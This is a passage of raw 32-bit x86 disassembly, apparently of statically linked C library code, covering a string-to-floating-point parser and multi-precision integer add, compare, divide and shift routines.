lea eax, [edi - 1]
mov ebx, edi
cmovne esi, eax
neg ebx
jmp 0x808b4ca
sub ecx, edi
xor ebx, ebx
mov esi, ecx
add ebx, edi
adc esi, 0
jmp 0x808b4f7
mov eax, dword [var_82ch]
cmp eax, dword [var_10fch]
jb 0x808b6c1
xor esi, esi
mov ebx, eax
jmp 0x808b499
mov ecx, dword [var_1080h]
test ecx, ecx
jle 0x808b74a
mov ebx, dword [var_1080h]
add ebx, 0x20
cmp ebx, 0x40
jg 0x808b704
mov eax, dword [var_1068h]
mov dword [var_1068h], 0
mov dword [var_1064h], eax
mov eax, dword [var_82ch]
mov dword [var_1080h], ebx
mov esi, eax
xor ebx, ebx
jmp 0x808b499
mov dword [var_1104h], 0x40
mov edx, dword [var_1080h]
sub dword [var_1104h], edx
mov edx, dword [var_1104h]
test edx, edx
jle 0x808b6f5
mov ecx, dword [var_1104h]
lea esi, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], esi
mov dword [esp], esi
mov dword [var_ch], ecx
call fcn.0808c6f0
jmp 0x808b6ef
mov ebx, dword [var_1080h]
sub ebx, 0x20
mov dword [var_106ch], ebx
jmp 0x808b6fb
mov dword [var_10f8h], 0
mov ebx, dword [var_82ch]
mov edi, dword [var_104ch]
xor eax, eax
mov edx, ebx
div edi
mov esi, eax
mov ebx, edx
mov eax, dword [var_1080h]
test eax, eax
jne 0x808b826
test esi, esi
mov edx, 0x20
je 0x808b798
bsr edx, esi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_106ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x40
jle 0x808b809
add edx, 0x40
mov eax, esi
mov dword [var_1120h], 0x61
sub ecx, edx
mov dword [var_10f8h], edx
shr eax, cl
mov dword [var_1068h], eax
mov edx, dword [var_1120h]
cmp edx, 0x40
mov dword [var_1080h], edx
jle 0x808b771
mov edi, dword [var_10e8h]
xor eax, eax
test edi, edi
jne 0x808b7ec
test ebx, ebx
je 0x808b7f1
mov eax, 1
mov dword [var_14h], eax
mov dword [var_ch], esi
mov eax, 0x1f
sub eax, dword [var_10f8h]
jmp 0x808b5a0
neg edx
mov dword [var_1064h], 0
mov dword [var_1068h], esi
add edx, 0x20
mov dword [var_1120h], edx
jmp 0x808b7cb
mov ecx, dword [var_1080h]
add ecx, 0x20
cmp ecx, 0x40
mov dword [var_1120h], ecx
jg 0x808b851
mov eax, dword [var_1068h]
mov dword [var_1068h], esi
mov dword [var_1064h], eax
jmp 0x808b7cb
mov dword [var_10f8h], 0x40
mov eax, dword [var_1080h]
sub dword [var_10f8h], eax
mov eax, dword [var_10f8h]
test eax, eax
jle 0x808b7cb
mov edx, dword [var_10f8h]
lea ecx, [var_1068h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, esi
mov ecx, 0x20
sub ecx, dword [var_10f8h]
shr eax, cl
or dword [var_1068h], eax
jmp 0x808b7cb
mov ecx, dword [var_107ch]
lea edi, [var_104ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808ae40
mov edx, dword [var_10f4h]
mov ecx, dword [var_107ch]
mov esi, dword [var_10ech]
mov dword [var_10h], ecx
mov ecx, dword [var_10f0h]
mov dword [var_ch], esi
mov eax, dword [edx + 4]
sub eax, 2
mov dword [var_8h], eax
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edi, dword [var_10ech]
mov esi, dword [var_10f4h]
mov edx, dword [var_107ch]
add edx, dword [esi + 4]
mov esi, dword [var_10f0h]
mov dword [var_10f0h], edi
mov dword [var_10ech], esi
lea ecx, [edx - 2]
sub edx, 3
test eax, eax
cmovne edx, ecx
mov dword [var_107ch], edx
jmp 0x808ae1b
mov dword [ebp + eax*4 - 0x1068], 0
jmp 0x808ad3c
mov eax, dword [var_1080h]
mov edx, dword [var_1080h]
add eax, 0x1e
dec edx
cmovns eax, edx
mov dword [var_10e0h], edx
and eax, 0xffffffe0
sub edx, eax
cmp edx, 0x1f
je 0x808ba80
cmp edx, 0x1e
jg 0x808ba1a
mov ecx, dword [var_10cch]
mov eax, 0x1f
mov ebx, 2
sub eax, edx
lea esi, [var_82ch]
mov dword [var_ch], eax
mov dword [var_4h], esi
mov eax, ebx
sub eax, ecx
mov dword [var_8h], ecx
lea eax, [ebp + eax*4 - 0x1068]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
sub eax, dword [var_1070h]
test eax, eax
jle 0x808b9e0
lea edx, [var_1068h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808b9d4
mov ecx, dword [var_1074h]
mov esi, dword [var_10e0h]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], ecx
mov dword [var_4h], esi
lea eax, [var_1068h]
mov dword [esp], eax
jmp 0x808ac6e
lea eax, [edx - 0x1f]
lea edi, [var_1068h]
lea edx, [var_82ch]
mov dword [var_ch], eax
mov dword [var_4h], edx
mov eax, dword [var_10cch]
mov dword [var_8h], eax
mov eax, 2
sub eax, dword [var_10cch]
lea eax, [edi + eax*4]
mov dword [esp], eax
call fcn.0808c750
mov edx, 1
sub edx, dword [var_1070h]
test edx, edx
mov dword [ebp + edx*4 - 0x1068], eax
jle 0x808b9e0
mov ecx, edi
mov eax, edx
mov dword [ecx], 0
add ecx, 4
dec eax
jne 0x808ba6f
jmp 0x808b9e0
mov eax, 2
mov ecx, dword [var_10cch]
lea esi, [var_82ch]
mov edi, eax
sub edi, dword [var_10cch]
cld
shl ecx, 2
shr ecx, 2
lea edi, [ebp + edi*4 - 0x1068]
rep movsd dword es:[edi], dword ptr [esi]
sub eax, dword [var_1070h]
test eax, eax
jle 0x808b9e0
lea edx, [var_1068h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808babd
jmp 0x808b9e0
mov ecx, dword [var_1070h]
lea edi, [var_82ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x808ab49
mov dword [var_10h], edx
mov ecx, dword [var_10c0h]
mov dword [var_8h], esi
mov edx, dword [var_10c8h]
mov dword [var_ch], ecx
mov ecx, dword [var_10c4h]
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
jmp 0x808aae4
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x808a6a2
mov ecx, dword [var_1094h]
mov eax, ebx
neg ecx
cmp ebx, ecx
jge 0x808a9ca
mov eax, ecx
jmp 0x808a9ca
mov eax, dword [var_1084h]
mov ecx, dword [arg_14h]
mov dword [var_10bch], 1
mov esi, 0x1f
movzx edx, byte [eax]
mov edi, dword [ecx + 0x34]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x808bb83
inc dword [var_1084h]
mov eax, dword [var_1084h]
movzx edx, byte [eax]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
je 0x808bb6a
cmp dl, 0x30
je 0x808bd41
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x808bd2a
inc dword [var_1084h]
mov edx, eax
mov eax, dword [edx*4 + 0x80a6200]
dec dword [var_1090h]
mov dword [var_1080h], eax
mov eax, esi
sub eax, dword [var_1080h]
lea ecx, [eax + 1]
mov esi, eax
shl edx, cl
mov ecx, dword [var_1080h]
mov dword [var_1064h], edx
mov edx, dword [var_1094h]
lea eax, [ecx + edx*4]
add eax, dword [var_106ch]
lea ebx, [eax - 5]
mov eax, dword [var_1090h]
mov dword [var_106ch], ebx
test eax, eax
jle 0x808bc67
mov eax, dword [var_10bch]
lea ebx, [ebp + eax*4 - 0x1068]
mov ecx, dword [var_1084h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x808bc24
mov eax, dword [var_10a8h]
add ecx, eax
mov dword [var_1084h], ecx
movzx edx, byte [ecx]
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x808bd13
inc dword [var_1084h]
mov edx, eax
lea eax, [esi + 1]
cmp eax, 3
jle 0x808bcba
lea ecx, [esi - 3]
sub esi, 4
shl edx, cl
or dword [ebx], edx
dec dword [var_1090h]
mov eax, dword [var_1090h]
test eax, eax
jle 0x808bc67
mov eax, dword [var_10bch]
test eax, eax
jns 0x808bc00
mov ebx, dword [var_10bch]
test ebx, ebx
jle 0x808bc89
lea edx, [var_1068h]
mov eax, dword [var_10bch]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x808bc7d
mov esi, dword [var_1074h]
mov eax, dword [var_106ch]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], esi
mov dword [var_4h], eax
jmp 0x808ba0c
mov ecx, 3
mov eax, edx
sub ebx, 4
sub ecx, esi
shr eax, cl
lea ecx, [esi + 0x1d]
or dword [ebx + 4], eax
shl edx, cl
dec dword [var_10bch]
js 0x808bce2
mov dword [ebx], edx
add esi, 0x1c
jmp 0x808bc4d
xor eax, eax
mov ecx, dword [var_1074h]
mov dword [var_10h], 0x1f
cmp dword [var_1090h], 0
mov dword [var_ch], edx
setg al
mov dword [var_8h], ecx
mov dword [var_14h], eax
mov eax, dword [var_106ch]
jmp 0x808ac61
mov ecx, dword [arg_14h]
inc dword [var_1084h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808bc3b
mov ecx, dword [arg_14h]
inc dword [var_1084h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x808bba3
inc dword [var_1084h]
mov ecx, dword [var_1084h]
movzx edx, byte [ecx]
cmp dl, 0x30
je 0x808bd41
jmp 0x808bb8c
mov eax, dword [var_1098h]
mov edx, dword [var_106ch]
shl eax, 2
sub edx, eax
jmp 0x808a98a
test al, al
jne 0x808a922
jmp 0x808a95f
lea esi, [esi]
mov ecx, dword [var_109ch]
movzx eax, byte [ecx + 1]
jmp 0x808bd70
mov edx, dword [arg_ch]
test edx, edx
jne 0x808a69d
jmp 0x808a6a2
mov ecx, dword [arg_ch]
test ecx, ecx
je 0x808a6a2
mov eax, dword [arg_8h]
mov esi, dword [arg_ch]
mov dword [esi], eax
jmp 0x808a6a2
mov eax, dword [var_109ch]
movzx eax, byte [eax]
mov byte [var_1112h], al
mov edx, dword [var_1090h]
xor eax, eax
test edx, edx
mov dword [var_1094h], edx
setne al
xor ebx, ebx
dec eax
cmp byte [var_1112h], 0
mov dword [var_1098h], eax
je 0x808c147
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x808be09
mov edx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808bdf5
test al, al
jne 0x808c140
add edi, dword [var_10a8h]
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
ja 0x808c0fd
mov eax, dword [arg_14h]
mov ecx, dword [eax + 0x38]
mov edx, esi
cmp dl, 0x30
je 0x808be52
mov eax, dword [var_1090h]
sub eax, dword [var_1094h]
cmp dword [var_1098h], 0xffffffff
cmovne eax, dword [var_1098h]
mov dword [var_1098h], eax
inc dword [var_1090h]
inc edi
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808be2b
cmp dword [var_1078h], 0x10
mov edx, esi
movsx eax, dl
jne 0x808be7e
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808be7e
cmp edx, 0x66
jle 0x808be2b
cmp dword [var_1078h], 0x10
mov dword [var_108ch], edi
je 0x808c0f4
cmp dword [ecx + eax*4], 0x65
je 0x808bf81
mov esi, dword [var_1094h]
cmp dword [var_1090h], esi
jle 0x808beb9
mov eax, dword [var_108ch]
cmp byte [eax - 1], 0x30
je 0x808bf64
mov ecx, dword [var_1094h]
cmp dword [var_1090h], ecx
jne 0x808a8bb
mov ebx, dword [var_1090h]
test ebx, ebx
jle 0x808a8bb
mov ebx, dword [var_106ch]
test ebx, ebx
jns 0x808a8bb
cmp dword [var_1078h], 0x10
je 0x808bf48
mov eax, dword [var_108ch]
movzx ecx, byte [eax - 1]
movsx eax, cl
sub eax, 0x30
cmp eax, 9
ja 0x808bf40
cmp cl, 0x30
jne 0x808a8bb
dec dword [var_1090h]
inc ebx
dec dword [var_108ch]
mov ecx, dword [var_1090h]
dec dword [var_1094h]
mov dword [var_106ch], ebx
test ecx, ecx
jle 0x808a8bb
test ebx, ebx
js 0x808bee7
jmp 0x808a8bb
mov esi, esi
dec dword [var_108ch]
jmp 0x808bee7
mov esi, dword [var_108ch]
movzx ecx, byte [esi - 1]
mov esi, dword [arg_14h]
mov eax, dword [esi + 0x34]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x10
jne 0x808bf05
jmp 0x808bf40
dec dword [var_108ch]
dec dword [var_1090h]
mov edx, dword [var_108ch]
cmp byte [edx - 1], 0x30
je 0x808bf64
jmp 0x808beb9
inc edi
mov dword [var_10b8h], 0
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x2d
je 0x808c0e8
cmp al, 0x2b
je 0x808c0df
lea eax, [esi - 0x30]
cmp al, 9
ja 0x808c0d4
cmp dword [var_1078h], 0x10
je 0x808c0a1
mov eax, dword [var_10b8h]
test eax, eax
je 0x808c08a
mov edx, dword [var_1094h]
add edx, 0x1383
mov eax, dword [var_106ch]
lea eax, [eax + eax*4]
lea ebx, [eax + eax]
cmp ebx, edx
mov dword [var_106ch], ebx
jg 0x808c01e
mov ecx, esi
inc edi
movsx eax, cl
lea ebx, [eax + ebx - 0x30]
mov dword [var_106ch], ebx
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x808bfd3
mov esi, dword [var_10b8h]
test esi, esi
je 0x808be9b
neg ebx
mov dword [var_106ch], ebx
jmp 0x808be9b
cmp dword [var_1098h], 0xffffffff
je 0x808c078
call fcn.08048b20
mov dword [eax], 0x22
mov eax, dword [var_10b8h]
test eax, eax
jne 0x808c074
mov eax, dword [var_1074h]
test eax, eax
je 0x808c06c
fld dword [0x80a6100]
inc edi
movzx eax, byte [edi]
sub eax, 0x30
cmp al, 9
jbe 0x808c04c
mov eax, dword [arg_ch]
test eax, eax
je 0x808a5c6
mov ecx, dword [arg_ch]
mov dword [ecx], edi
jmp 0x808a5c6
fld dword [0x80a61a0]
jmp 0x808c04c
fldz
jmp 0x808c04c
mov eax, dword [var_1074h]
test eax, eax
je 0x808c074
fld dword [0x80a6104]
jmp 0x808c04c
mov eax, dword [var_1098h]
sub eax, dword [var_1094h]
lea edx, [eax + 0x1344]
jmp 0x808bfd3
mov eax, dword [var_10b8h]
mov ecx, dword [var_1094h]
test eax, eax
lea edx, [ecx*4 + 0x403d]
jne 0x808bfd3
mov edx, dword [var_1098h]
mov eax, ecx
shl eax, 2
sub edx, eax
lea edx, [edx + 0x4000]
jmp 0x808bfd3
mov edi, dword [var_108ch]
jmp 0x808be9b
inc edi
movzx esi, byte [edi]
jmp 0x808bfa1
mov dword [var_10b8h], 1
jmp 0x808c0df
cmp dword [ecx + eax*4], 0x70
jmp 0x808be95
cmp dword [var_1078h], 0x10
je 0x808c116
mov ecx, esi
movsx eax, cl
mov esi, dword [arg_14h]
mov ecx, dword [esi + 0x38]
jmp 0x808be7e
mov edx, esi
movsx eax, dl
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x808be7e
cmp edx, 0x66
jle 0x808be2b
jmp 0x808be7e
nop
lea esi, [esi]
mov edx, esi
movsx eax, dl
jmp 0x808c10b
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
jmp 0x808be09
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
jmp 0x808a806
mov edx, dword [arg_14h]
mov ecx, esi
movsx eax, cl
mov ecx, dword [edx + 0x38]
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jbe 0x808a7cb
cmp eax, 0x66
ja 0x808a7cb
inc dword [var_1090h]
jmp 0x808a800
mov eax, dword [arg_14h]
mov edx, esi
mov ecx, dword [eax + 0x38]
cmp dl, byte [ecx + 0x184]
jl 0x808c1aa
cmp dl, byte [ecx + 0x198]
jle 0x808a7a3
xor ebx, ebx
cmp byte [var_1111h], 0
je 0x808a7a3
mov ecx, dword [var_109ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x808a7a3
mov edx, dword [var_109ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x808c1c2
jmp 0x808a7a3
mov ecx, dword [var_10a0h]
movzx eax, byte [ecx]
jmp 0x808a78b
mov ecx, esi
cmp cl, 0x30
jne 0x808a78f
inc edi
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x30
je 0x808c1f8
jmp 0x808a78f
mov edx, dword [arg_14h]
movsx eax, byte [edi + 1]
mov ecx, dword [edx + 0x38]
cmp dword [ecx + eax*4], 0x78
jne 0x808a731
add edi, 2
mov dword [var_1078h], 0x10
movzx esi, byte [edi]
mov dword [var_10a4h], 0
jmp 0x808a731
lea esi, [esi]
test al, al
jne 0x808a54d
jmp 0x808a53d
mov edx, dword [var_109ch]
movzx eax, byte [edx]
jmp 0x808c240
inc edi
movzx esi, byte [edi]
jmp 0x808a504
mov dword [var_1074h], 1
jmp 0x808c258
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0808a440
leave
ret
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
mov edi, dword [arg_ch]
mov esi, dword [arg_10h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_18h]
mov eax, ecx
shr ecx, 3
neg eax
and eax, 7
je 0x808c2d8
inc ecx
shl eax, 2
sub edi, eax
sub esi, eax
sub edx, eax
shr eax, 2
lea eax, [eax + eax*8 + 0x808c2d5]
jmp eax
lea esi, [esi]
mov eax, dword [esi]
adc eax, dword [edx]
mov dword [edi], eax
mov eax, dword [esi + 4]
adc eax, dword [edx + 4]
mov dword [edi + 4], eax
mov eax, dword [esi + 8]
adc eax, dword [edx + 8]
mov dword [edi + 8], eax
mov eax, dword [esi + 0xc]
adc eax, dword [edx + 0xc]
mov dword [edi + 0xc], eax
mov eax, dword [esi + 0x10]
adc eax, dword [edx + 0x10]
mov dword [edi + 0x10], eax
mov eax, dword [esi + 0x14]
adc eax, dword [edx + 0x14]
mov dword [edi + 0x14], eax
mov eax, dword [esi + 0x18]
adc eax, dword [edx + 0x18]
mov dword [edi + 0x18], eax
mov eax, dword [esi + 0x1c]
adc eax, dword [edx + 0x1c]
mov dword [edi + 0x1c], eax
lea edi, [edi + 0x20]
lea esi, [esi + 0x20]
lea edx, [edx + 0x20]
dec ecx
jne 0x808c2d8
sbb eax, eax
neg eax
pop esi
pop edi
ret
push ebp
mov ebp, esp
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
dec edx
js 0x808c34b
mov eax, dword [ecx + edx*4]
cmp dword [ebx + edx*4], eax
jne 0x808c350
dec edx
jns 0x808c340
xor eax, eax
pop ebx
leave
ret
seta al
movzx eax, al
lea eax, [eax + eax - 1]
jmp 0x808c34d
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
cmp dword [arg_1ch], 1
mov dword [var_10h], 0
mov esi, dword [arg_14h]
je 0x808c67e
jle 0x808c665
cmp dword [arg_1ch], 2
je 0x808c55b
mov eax, esi
mov ebx, dword [arg_10h]
mov edi, dword [arg_1ch]
sub eax, dword [arg_1ch]
mov ecx, dword [arg_1ch]
mov edx, dword [arg_1ch]
lea ebx, [ebx + eax*4]
mov eax, dword [arg_18h]
mov dword [arg_10h], ebx
mov edi, dword [eax + edi*4 - 4]
mov edx, dword [eax + edx*4 - 8]
mov dword [var_2ch], edi
mov dword [var_20h], edx
mov edi, ebx
mov ebx, dword [ebx + ecx*4 - 4]
cmp ebx, dword [var_2ch]
jb 0x808c42a
ja 0x808c3fc
mov eax, ecx
mov dword [esp], edi
dec eax
mov dword [var_8h], eax
mov eax, dword [arg_18h]
mov dword [var_4h], eax
call fcn.0808c330
test eax, eax
js 0x808c42a
mov ebx, dword [arg_10h]
mov edx, dword [arg_1ch]
mov ecx, dword [arg_18h]
mov dword [var_4h], ebx
mov dword [esp], ebx
mov dword [var_ch], edx
mov dword [var_8h], ecx
call fcn.0808d570
mov dword [var_10h], 1
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
mov ebx, dword [eax + edi*4 - 4]
mov eax, dword [arg_ch]
add eax, esi
sub eax, dword [arg_1ch]
dec eax
mov dword [var_1ch], eax
js 0x808c50a
lea esi, [esi]
mov edx, dword [arg_ch]
cmp dword [var_1ch], edx
jl 0x808c529
sub dword [arg_10h], 4
mov ecx, dword [arg_1ch]
mov esi, dword [arg_10h]
mov ecx, dword [esi + ecx*4]
mov dword [var_24h], ecx
cmp ebx, dword [var_2ch]
mov esi, 0xffffffff
je 0x808c4b0
mov edx, dword [arg_1ch]
mov ecx, dword [arg_10h]
mov eax, dword [ecx + edx*4 - 4]
mov edx, ebx
div dword [var_2ch]
mov ecx, edx
mov esi, eax
mov eax, dword [var_20h]
mul esi
cmp edx, ecx
mov ebx, eax
jbe 0x808c515
add ecx, dword [var_2ch]
dec esi
cmp ecx, dword [var_2ch]
jb 0x808c4b0
cmp ebx, dword [var_20h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_20h]
cmp edx, ecx
ja 0x808c488
jne 0x808c4b0
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
cmp ebx, dword [eax + edi*4 - 8]
ja 0x808c488
nop
mov edx, dword [arg_1ch]
mov ecx, dword [arg_18h]
mov dword [var_ch], esi
mov ebx, dword [arg_10h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov dword [esp], ebx
call fcn.0808d600
cmp dword [var_24h], eax
je 0x808c4ed
mov edi, dword [arg_1ch]
mov eax, dword [arg_18h]
mov dword [var_4h], ebx
mov dword [esp], ebx
dec esi
mov dword [var_ch], edi
mov dword [var_8h], eax
call fcn.0808c2a0
mov edx, dword [var_1ch]
mov ecx, dword [arg_8h]
mov edi, dword [arg_10h]
mov dword [ecx + edx*4], esi
dec edx
mov esi, dword [arg_1ch]
mov dword [var_1ch], edx
mov ebx, dword [edi + esi*4 - 4]
jns 0x808c440
mov eax, dword [var_10h]
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
jne 0x808c4b0
mov edi, dword [arg_1ch]
mov eax, dword [arg_10h]
cmp ebx, dword [eax + edi*4 - 8]
ja 0x808c488
jmp 0x808c4b0
mov esi, dword [arg_1ch]
mov edi, dword [arg_10h]
mov edx, dword [arg_1ch]
mov esi, dword [edi + esi*4 - 4]
dec edx
mov dword [var_24h], esi
js 0x808c54d
lea esi, [esi]
mov edi, dword [arg_10h]
mov eax, dword [edi + edx*4]
mov dword [edi + edx*4 + 4], eax
dec edx
jns 0x808c540
mov eax, dword [arg_10h]
mov dword [eax], 0
jmp 0x808c45c
mov edi, dword [arg_10h]
mov ecx, dword [arg_18h]
mov ebx, dword [arg_18h]
lea eax, [edi + esi*4]
mov ecx, dword [ecx + 4]
lea edx, [eax - 8]
mov ebx, dword [ebx]
mov eax, dword [eax - 8]
mov dword [arg_10h], edx
mov edx, dword [edx + 4]
mov dword [var_18h], ecx
mov dword [var_30h], ebx
cmp edx, ecx
jb 0x808c595
ja 0x808c588
cmp eax, ebx
jb 0x808c595
mov dword [var_10h], 1
sub eax, dword [var_30h]
sbb edx, dword [var_18h]
mov ecx, dword [arg_ch]
lea esi, [esi + ecx - 3]
test esi, esi
mov dword [var_14h], esi
js 0x808c608
mov ebx, dword [arg_ch]
cmp dword [var_14h], ebx
jl 0x808c657
sub dword [arg_10h], 4
cmp edx, dword [var_18h]
je 0x808c615
div dword [var_18h]
mov dword [var_2ch], eax
mov ecx, edx
mul dword [var_30h]
mov esi, dword [arg_10h]
mov esi, dword [esi]
mov dword [var_28h], esi
nop
lea esi, [esi]
cmp edx, ecx
ja 0x808c5db
jne 0x808c5ec
cmp eax, dword [var_28h]
jbe 0x808c5ec
add ecx, dword [var_18h]
dec dword [var_2ch]
sub eax, dword [var_30h]
sbb edx, 0
cmp ecx, dword [var_18h]
jae 0x808c5d0
mov edi, dword [var_14h]
mov esi, dword [var_2ch]
mov ebx, dword [arg_8h]
mov dword [ebx + edi*4], esi
mov edi, dword [var_28h]
sub edi, eax
sbb ecx, edx
mov eax, edi
mov edx, ecx
dec dword [var_14h]
jns 0x808c5a3
mov ecx, dword [arg_10h]
mov dword [ecx + 4], edx
mov dword [ecx], eax
jmp 0x808c50a
lea ecx, [edx + eax]
mov dword [var_2ch], 0xffffffff
cmp ecx, edx
jae 0x808c642
sub ecx, dword [var_30h]
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov eax, dword [edi]
mov edx, ecx
mov ecx, dword [var_14h]
add eax, dword [var_30h]
adc edx, 0
mov dword [ebx + ecx*4], 0xffffffff
jmp 0x808c603
mov edx, dword [var_30h]
lea eax, [edx - 1]
test edx, edx
cmovne edx, eax
mov eax, dword [var_30h]
neg eax
jmp 0x808c5c3
mov esi, dword [arg_10h]
mov dword [esi], 0
jmp 0x808c5b3
mov eax, dword [arg_1ch]
test eax, eax
jne 0x808c3ad
mov eax, 1
cdq
idiv dword [var_10h]
jmp 0x808c50d
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov ebx, dword [eax]
mov ecx, dword [edx + esi*4 - 4]
cmp ecx, ebx
jb 0x808c697
sub ecx, ebx
mov dword [var_10h], 1
mov eax, dword [arg_8h]
mov edi, dword [arg_ch]
lea eax, [eax + edi*4]
mov edi, esi
sub edi, 2
mov dword [arg_8h], eax
js 0x808c6bf
mov edx, dword [arg_10h]
mov esi, dword [arg_8h]
mov eax, dword [edx + edi*4]
mov edx, ecx
div ebx
mov dword [esi + edi*4], eax
mov ecx, edx
dec edi
jns 0x808c6aa
mov eax, dword [arg_ch]
mov edi, dword [arg_ch]
shl eax, 2
sub dword [arg_8h], eax
dec edi
js 0x808c6e1
xor esi, esi
mov edx, ecx
mov eax, esi
div ebx
mov ecx, edx
mov edx, dword [arg_8h]
mov dword [edx + edi*4], eax
dec edi
jns 0x808c6d0
mov ebx, dword [arg_10h]
mov dword [ebx], ecx
jmp 0x808c50a
nop
nop
nop
nop
nop
push edi
push esi
push ebx
mov edi, dword [arg_10h]
mov esi, dword [arg_14h]
mov edx, dword [arg_18h]
mov ecx, dword [arg_1ch]
sub esi, 4
mov ebx, dword [esi + edx*4]
xor eax, eax
shld eax, ebx, cl
dec edx
je 0x808c73f
push eax
test dl, 1
jne 0x808c72a
mov eax, ebx
lea esi, [esi]
mov ebx, dword [esi + edx*4]
shld eax, ebx, cl
mov dword [edi + edx*4], eax
dec edx
mov eax, dword [esi + edx*4]
shld ebx, eax, cl
mov dword [edi + edx*4], ebx
dec edx
jne 0x808c720
shl eax, cl
mov dword [edi], eax
pop eax
pop ebx
pop esi
pop edi
ret
shl ebx, cl
mov dword [edi], ebx
pop ebx
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
push edi
push esi
push ebx
mov edi, dword [arg_10h]
mov esi, dword [arg_14h]
mov edx, dword [arg_18h]
mov ecx, dword [arg_1ch]
lea edi, [edi + edx*4 - 4]
lea esi, [esi + edx*4]
neg edx
mov ebx, dword [esi + edx*4]
xor eax, eax
shrd eax, ebx, cl
inc edx
je 0x808c79f
push eax
test dl, 1
jne 0x808c78a
mov eax, ebx
nop
mov ebx, dword [esi + edx*4]
shrd eax, ebx, cl
mov dword [edi + edx*4], eax
inc edx
mov eax, dword [esi + edx*4]
shrd ebx, eax, cl
mov dword [edi + edx*4], ebx
inc edx
jne 0x808c780
shr eax, cl
mov dword [edi], eax
pop eax
pop ebx
pop esi
pop edi
ret
shr ebx, cl
mov dword [edi], ebx
pop ebx
pop esi
pop edi
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_10h]
mov edi, dword [arg_8h]
add eax, dword [arg_18h]
cmp dword [arg_18h], 0x1f
lea eax, [edi + eax*4 - 4]
mov dword [var_10h], eax
jg 0x808c8d3
mov edx, dword [arg_18h]
xor eax, eax
test edx, edx
je 0x808c851
mov edx, dword [arg_14h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808c8b4
je 0x808c891
xor eax, eax
cmp eax, dword [arg_10h]
jge 0x808c814
mov dword [edi + eax*4], 0
inc eax
cmp eax, dword [arg_10h]
jl 0x808c807
xor eax, eax
mov ecx, dword [arg_10h]
mov ebx, 1
mov dword [edi + ecx*4], eax
add edi, 4
cmp ebx, dword [arg_18h]
jge 0x808c851
lea esi, [esi]
mov edx, dword [arg_14h]
mov eax, dword [edx + ebx*4]
cmp eax, 1
ja 0x808c875
mov eax, 0
je 0x808c859
mov edx, dword [arg_10h]
inc ebx
mov dword [edi + edx*4], eax
add edi, 4
